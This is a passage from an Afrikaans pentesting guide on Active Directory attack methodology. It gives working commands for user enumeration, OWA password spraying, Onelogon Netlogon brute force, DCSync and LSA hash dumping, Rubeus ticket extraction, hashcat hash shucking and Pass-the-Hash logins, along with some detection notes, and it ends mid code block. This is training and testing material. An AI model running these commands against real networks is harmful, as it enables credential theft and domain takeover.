# Active Directory-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n grondliggende tegnologie wat **netwerkadministrateurs** in staat stel om **domeine**, **gebruikers** en **objekte** binne ’n netwerk doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal en fasiliteer die organisering van ’n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe**, terwyl **toegangsregte** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome** en **woude**. ’n **Domein** omvat ’n versameling objekte, soos **gebruikers** of **toestelle**, wat ’n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur ’n gedeelde struktuur verbind word, en ’n **woud** verteenwoordig die versameling van veelvuldige bome wat deur **trust relationships** verbind is en die boonste laag van die organisatoriese struktuur vorm. Spesifieke **toegangs-** en **kommunikasieregte** kan op elk van hierdie vlakke toegeken word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Directory** – Bevat alle inligting rakende Active Directory-objekte.
2. **Object** – Dui entiteite binne die directory aan, insluitend **gebruikers**, **groepe** of **gedeelde vouers**.
3. **Domain** – Dien as ’n houer vir directory-objekte, met die vermoë dat veelvuldige domeine binne ’n **forest** kan bestaan, waar elkeen sy eie versameling objekte handhaaf.
4. **Tree** – ’n Groepering van domeine wat ’n gemeenskaplike worteldomein deel.
5. **Forest** – Die toppunt van die organisatoriese struktuur in Active Directory, bestaande uit verskeie bome met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks dienste wat noodsaaklik is vir die gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie dienste sluit in:

1. **Domain Services** – Sentreer datastoor en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **authentication**- en **search**-funksionaliteit.
2. **Certificate Services** – Hou toesig oor die skepping, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-geaktiveerde toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Bied **single-sign-on**-vermoëns om gebruikers oor verskeie webtoepassings in ’n enkele sessie te authenticate.
5. **Rights Management** – Help met die beskerming van materiaal waarop kopiereg rus deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS Service** – Noodsaaklik vir die resolusie van **domain names**.

Vir ’n meer gedetailleerde verduideliking, kyk na: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om ’n **AD** te **attack**, moet jy die **Kerberos authentication process** baie goed **verstaan**.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie inligting by [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter commands jy kan uitvoer om ’n AD te enumerate/exploit.

> [!WARNING]
> Kerberos-kommunikasie **vereis normaalweg ’n fully qualified domain name (FQDN)** sodat die client ’n ticket vir die korrekte SPN kan verkry. Toegang tot ’n masjien deur middel van ’n IP-adres val gewoonlik terug na NTLM in plaas van Kerberos.

## Recon Active Directory (No creds/sessions)

As jy net toegang tot ’n AD-omgewing het, maar geen credentials/sessions het nie, kan jy:

- **Pentest the network:**
- Scan die netwerk, vind masjiene en oop poorte, en probeer om **vulnerabilities te exploit** of **credentials daaruit te extract** (byvoorbeeld, [printers can be very interesting targets](ad-information-in-printers.md)).
- Deur DNS te enumerate, kan jy inligting oor sleutelbedieners in die domein verkry, soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Kyk na die algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows-weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- ’n Meer gedetailleerde gids oor hoe om ’n SMB-bediener te enumerate, kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- ’n Meer gedetailleerde gids oor hoe om LDAP te enumerate, kan hier gevind word (let **veral op die anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel credentials deur [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Kry toegang tot ’n host deur [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) bloot te stel
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extract usernames/name uit interne dokumente, social media en services (hoofsaaklik web) binne die domeinomgewings, asook uit die publiek beskikbare bronne.
- As jy die volledige name van maatskappywerknemers vind, kan jy verskillende AD **username conventions (**[**lees dit**](https://activedirectorypro.com/active-directory-user-naming-convention/)) probeer. Die algemeenste conventions is: _NameSurname_, _Name.Surname_, _NamSur_ (3letters van elkeen), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk na die bladsye oor [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wanneer ’n **invalid username is requested**, sal die bediener reageer met die **Kerberos error**-kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om vas te stel dat die username invalid was. **Valid usernames** sal óf die **TGT in a AS-REP**-response óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_ oplewer, wat aandui dat die gebruiker pre-authentication moet uitvoer.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon)-interface op domain controllers. Die metode roep die `DsrGetDcNameEx2`-funksie aan nadat die MS-NRPC-interface gebind is, om te kontroleer of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)-tool implementeer hierdie tipe enumeration. Die navorsing kan [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> gevind word.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie bedieners in die netwerk gevind het, kan jy ook **user enumeration teen dit uitvoer**. Jy kan byvoorbeeld die instrument [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname in [**hierdie github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) vind.
>
> Jy behoort egter die **name van die mense wat by die maatskappy werk** te hê uit die recon-stap wat jy voorheen moes uitgevoer het. Met die naam en van kon jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om moontlike geldige gebruikersname te genereer.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Selfs nadat **Zerologon** op die DC gepatch is, kan rekeninge wat eksplisiet op die allow-list geplaas is steeds aan **legacy/vulnerable Netlogon secure-channel behavior** blootgestel wees. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registerwaarde **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie waarde is ’n **SDDL security descriptor** (sien [Security Descriptors](security-descriptors.md)). Enige rekening of groep wat die relevante ACE in die DACL toegestaan is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` plaas effektief **Everyone** op die allow-list.

Praktiese operator-werkvloei:

1. **Identifiseer principals op die allow-list** deur beide **SYSVOL/GPO** en die **live DC registry** na te gaan.
2. **Resolve SIDs** wat in die SDDL gevind word na werklike AD-gebruikers/rekenaars, en prioritiseer **DC machine accounts**, **trust accounts** en ander bevoorregte masjiene.
3. Probeer herhaaldelik **MS-NRPC / Netlogon authentication** as die rekening op die allow-list.
4. Nadat ’n suksesvolle raaiskoot gemaak is, misbruik **Netlogon password-setting** om die teikenrekening se wagwoord terug te stel (die publieke PoC stel dit op ’n leë string).<sup>[[9]](#references)[[10]](#references)</sup>

Vinnige triage-/labvoorbeelde uit die publieke artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Notas:

- Die **scanner** is nuttig omdat die effektiewe allow-list in **SYSVOL**, in die **registry**, of in albei kan bestaan.
- Die exploit path self is belangrik omdat dit **geen Domain Admin-voorregte vereis nie** nadat ’n kwesbare rekening geïdentifiseer is.
- Om ’n **Domain Controller-masjienrekening** soos `DC$` te kompromitteer, is besonder gevaarlik omdat die terugstel van daardie wagwoord direk breër **AD takeover**-paaie kan moontlik maak.
- **Brute-force haalbaarheid** hang van die modus af: die publieke artifact beskryf ’n meet-in-the-middle-benadering, ’n **24-bit** brute force wanneer ’n ander rekenaarrekening beskikbaar is, en stadiger **32-bit** variante.

Opsporings-/hardening-notas:

- Oudit die allow-list-beleid en verwyder alles behalwe tydelike, uitdruklik vereiste versoenbaarheidsuitsonderings.
- Monitor DC **System**-gebeurtenisse **5827/5828/5829/5830/5831** om kwesbare Netlogon-verbindings op te spoor wat geweier, ontdek of uitdruklik deur beleid toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **hoërisiko** totdat die legacy-afhanklikheid verwyder is.

### Ken een of verskeie gebruikersname

Goed, jy weet dus reeds dat jy ’n geldige gebruikersnaam het, maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): Indien ’n gebruiker **nie** die attribuut _DONT_REQ_PREAUTH_ het nie, kan jy ’n **AS_REP-boodskap aanvra** vir daardie gebruiker wat data sal bevat wat deur ’n afleiding van die gebruiker se wagwoord geënkripteer is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die mees **algemene wagwoorde** met elk van die ontdekte gebruikers; dalk gebruik een of ander gebruiker ’n swak wagwoord (hou die wagwoordbeleid in gedagte!).
- Let daarop dat jy ook **OWA-bedieners kan spray** om toegang tot die gebruikers se posbedieners te probeer verkry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy kan moontlik sommige uitdaging-**hashes** **verkry** deur sekere protokolle van die **netwerk** te **poison**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory-enumeration verskaf gebruikersname, e-posidentifiseerders en naamgewingpatrone, kandidaatgashere en dienste wat gedwing kan word om te authenticate. Gebruik daardie konteks om lewensvatbare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) en potensiële paaie na die AD-omgewing te identifiseer.

### NetExec workspace-gedrewe recon- en relay-houdingkontroles

- Gebruik **`nxcdb` workspaces** om AD-reconstatus per engagement te behou: `workspace create <name>` skep protokol-spesifieke SQLite-databasisse onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wissel aansigte met `proto smb|mssql|winrm` en lys versamelde secrets met `creds`. Verwyder sensitiewe data handmatig wanneer jy klaar is: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** wys **domain**, **OS build**, **SMB signing requirements** en **Null Auth**. Lede wat `(signing:False)` wys, is **relay-prone**, terwyl DC’s dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** direk vanaf NetExec-uitset om targeting te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay to the DC is blocked** deur signing, ondersoek steeds die **LDAP**-sekuriteitsopset: `netexec ldap <dc>` wys `(signing:None)` / swak channel binding. ’n DC met SMB signing required maar LDAP signing disabled bly ’n lewensvatbare **relay-to-LDAP**-teiken vir misbruike soos **SPN-less RBCD**.

### Kliëntkant-drukker credential leaks → grootmaat-domeincredential-validering

- Drukker-/web-UI's **embed masked admin passwords in HTML**. Deur die bron/devtools te bekyk, kan cleartext onthul word (bv. `<input value="<password>">`), wat Basic-auth-toegang bied om druk- en skandeerbewaarplekke te ondersoek.
- Herwonne drukopdragte kan **plaintext onboarding docs** met wagwoorde per gebruiker bevat. Hou die parings in lyn tydens toetsing:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steel NTLM Creds

As jy **toegang tot ander rekenaars of shares** met die **null- of guest-gebruiker** kan kry, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien dit op een of ander manier oopgemaak word, **’n NTLM-verifikasie teenoor jou sal aktiveer**, sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash waaroor jy reeds beskik as ’n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmateriale direk van die NT-hash afgelei word. In plaas daarvan om lang passphrases in Kerberos RC4-tickets, NetNTLM-challenges of cached credentials met brute force te probeer kraak, voer jy die NT-hashes aan Hashcat se NT-candidate modes en laat jy dit wagwoordhergebruik valideer sonder om ooit die plaintext te leer. Dit is besonder kragtig ná ’n domain compromise, waar jy duisende huidige en historiese NT-hashes kan versamel.<sup>[[5]](#references)</sup>

Gebruik shucking wanneer:

- Jy ’n NT-corpus uit DCSync-, SAM/SECURITY-dumps of credential vaults het en hergebruik in ander domains/forests moet toets.
- Jy RC4-gebaseerde Kerberos-materiale (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-responses of DCC/DCC2-blobs vaslê.
- Jy vinnig hergebruik vir lang, onkraakbare passphrases wil bewys en onmiddellik via Pass-the-Hash wil pivot.

Die tegniek **werk nie** teen encryption types waarvan die sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). Indien ’n domain AES-only afdwing, moet jy na die gewone password modes terugkeer.

#### Bou van ’n NT-hash-corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootste moontlike stel NT-hashes (en hul vorige waardes) te verkry:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-inskrywings vergroot die kandidaatpoel aansienlik omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-secrets te versamel, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) onttrek plaaslike SAM/SECURITY-data en cached domain logons (DCC/DCC2). Verwyder duplikate en voeg daardie hashes by dieselfde `nt_candidates.txt`-lys.
- **Volg metadata** – Hou die gebruikersnaam/domain wat elke hash opgelewer het by (selfs al bevat die wordlist slegs hex). Ooreenstemmende hashes wys onmiddellik watter principal ’n wagwoord hergebruik sodra Hashcat die wenkandidaat vertoon.
- Verkies kandidate uit dieselfde forest of ’n trusted forest; dit maksimeer die kans op oorvleueling tydens shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-candidate-insette **moet rou 32-hex NT-hashes bly**. Deaktiveer rule engines (geen `-r` of hybrid modes nie) omdat mangling die kandidaat-sleutelmateriale beskadig.
- Hierdie modes is nie inherent vinniger nie, maar die NTLM-keyspace (~30 000 MH/s op ’n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om ’n saamgestelde NT-lys te toets, is baie goedkoper as om die volledige wagwoordruimte in die stadiger formaat te verken.
- Gebruik altyd die **nuutste Hashcat-build** (`git clone https://github.com/hashcat/hashcat && make install`) omdat modes 31500/31600/35300/35400 onlangs verskeep is.<sup>[[7]](#references)</sup>
- Daar is tans geen NT-mode vir AS-REQ Pre-Auth nie, en AES-etypes (19600/19700) vereis die plaintext-wagwoord omdat hul sleutels via PBKDF2 van UTF-16LE-wagwoorde afgelei word, nie van rou NT-hashes nie.

#### Voorbeeld – Kerberoast RC4 (mode 35300)

1. Vang ’n RC4 TGS vir ’n teiken-SPN met ’n low-privileged user vas (sien die Kerberoast-bladsy vir besonderhede):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck die ticket met jou NT-lys:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat lei die RC4-sleutel van elke NT-kandidaat af en valideer die `$krb5tgs$23$...`-blob. ’n Pas bevestig dat die service account een van jou bestaande NT-hashes gebruik.

3. Pivot onmiddellik via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan die plaintext later opsioneel herwin met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Voorbeeld – Cached credentials (mode 31600)

1. Dump cached logons vanaf ’n compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopieer die DCC2-reël vir die interessante domain-gebruiker na `dcc2_highpriv.txt` en shuck dit:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. ’n Suksesvolle pas lewer die NT-hash wat reeds in jou lys bekend is, wat bewys dat die cached user ’n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in fast NTLM mode om die string te herwin.

Presies dieselfde workflow is van toepassing op NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra ’n pas geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH begin, of die NT-hash weer offline met masks/rules kraak.



## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy **die credentials of ’n session van ’n geldige domain account kompromitteer het**. Indien jy geldige credentials of ’n shell as ’n domain user het, **moet jy onthou dat die opsies wat vroeër gegee is steeds opsies is om ander users te kompromitteer**.

Voordat jy met authenticated enumeration begin, moet jy die **Kerberos double-hop-probleem** verstaan.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Die kompromittering van ’n account is ’n **groot stap in die assessering van die domain**, omdat dit authenticated **Active Directory enumeration** moontlik maak:

Met betrekking tot [**ASREPRoast**](asreproast.md) kan jy nou elke moontlike kwesbare gebruiker vind, en met betrekking tot [**Password Spraying**](password-spraying.md) kan jy ’n **lys van al die usernames** kry en die wagwoord van die compromised account, leë wagwoorde en nuwe belowende wagwoorde probeer.

- Jy kan die [**CMD gebruik om basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir recon**](../basic-powershell-for-pentesters/index.html) gebruik, wat meer stealthy sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog ’n uitstekende tool vir recon in ’n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy nie** (afhangend van die collection methods wat jy gebruik), maar **as jy nie daaroor omgee nie**, moet jy dit beslis probeer. Vind waar users RDP kan gebruik, vind paths na ander groups, ens.
- **Ander geoutomatiseerde AD-enumeration tools is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records van die AD**](ad-dns-records.md), aangesien dit interessante inligting kan bevat.
- ’n **Tool met ’n GUI** wat jy kan gebruik om die directory te enumerate, is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook in die LDAP-database met **ldapsearch** soek vir credentials in die velde _userPassword_ en _unixUserPassword_, of selfs vir _Description_. Sien [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander methods.
- Indien jy **Linux** gebruik, kan jy die domain ook enumerate met [**pywerview**](https://github.com/the-useless-one/pywerview).
- Jy kan ook geoutomatiseerde tools probeer soos:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Onttrekking van alle domain users**

Dit is baie maklik om al die domain usernames vanaf Windows te verkry (`net user /domain`, `Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumeration-afdeling klein, is dit die belangrikste deel van alles. Gaan na die links (hoofsaaklik dié oor cmd, powershell, powerview en BloodHound), leer hoe om ’n domain te enumerate en oefen totdat jy gemaklik voel. Tydens ’n assessment sal dit die sleutelmoment wees om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS tickets** wat deur services gebruik word wat aan user accounts gekoppel is, en die cracking van hul encryption—wat op user passwords gebaseer is—**offline**.

Meer hieroor:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Sodra jy credentials verkry het, kan jy nagaan of jy toegang tot enige **machine** het. Hiervoor kan jy **CrackMapExec** gebruik om met verskillende protocols aan verskeie servers te probeer koppel, volgens jou port scans.

### Local Privilege Escalation

Indien jy credentials of ’n session as ’n gewone domain user gekompromitteer het en toegang tot **enige machine in die domain** kan kry, soek ’n pad om **privileges plaaslik te eskaleer en credentials te versamel**. Local administrator-privileges kan jou toelaat om **ander users se hashes** uit memory (LSASS) en plaaslike storage (SAM) te dump.

Daar is ’n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en ’n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige user sal vind wat jou **permission gee om toegang tot** onverwagte resources te kry, maar jy kan nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Met domein credentials of 'n gebruikersessie, besoek NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) weer: geauthentiseerde enumeration- en coercion-tegnieke kan relay-paaie blootlê wat tydens ongeauthentiseerde reconnaissance nie beskikbaar was nie.

### Soek na Creds in Computer Shares | SMB Shares

Noudat jy basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word, kan vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige herhalende taak (en nog meer as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om meer te leer oor tools wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steel NTLM Creds

As jy **toegang tot ander rekenaars of shares** kan kry, kan jy **lêers plaas** (soos 'n SCF-lêer) wat, indien dit op een of ander manier verkry word, 'n **NTLM authentication teen jou sal trigger**, sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geauthentiseerde gebruiker toegelaat om die **domeinbeheerder te kompromitteer**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation op Active Directory MET privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domeingebruiker nie genoeg nie; jy benodig spesiale privileges/credentials om hierdie attacks uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **local admin**-account te **kompromitteer** deur [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), insluitend relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [plaaslike privilege escalation](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in die geheue en plaaslik te dump.\
[**Lees hierdie bladsy oor verskillende maniere om die hashes te bekom.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van 'n gebruiker het**, kan jy dit gebruik om die gebruiker te **impersonate**.\
Jy moet 'n **tool** gebruik wat die **NTLM authentication uitvoer met** daardie **hash**, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** binne die **LSASS** **inject**, sodat daardie **hash gebruik sal word wanneer enige NTLM authentication uitgevoer word.** Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie attack het ten doel om die gebruiker se NTLM hash te **gebruik om Kerberos-tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor die NTLM-protokol. Daarom kan dit veral **nuttig wees in netwerke waar die NTLM-protokol gedeaktiveer is** en slegs **Kerberos as authentication-protokol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)**-attackmetode **steel aanvallers 'n gebruiker se authentication-ticket** in plaas van sy wagwoord of hash-waardes. Hierdie gesteelde ticket word dan gebruik om die gebruiker te **impersonate**, wat ongemagtigde toegang tot hulpbronne en dienste binne 'n netwerk verleen.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **wagwoord** van 'n **plaaslike administrato**r het, moet jy probeer om **plaaslik** by ander **PCs** daarmee aan te meld.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
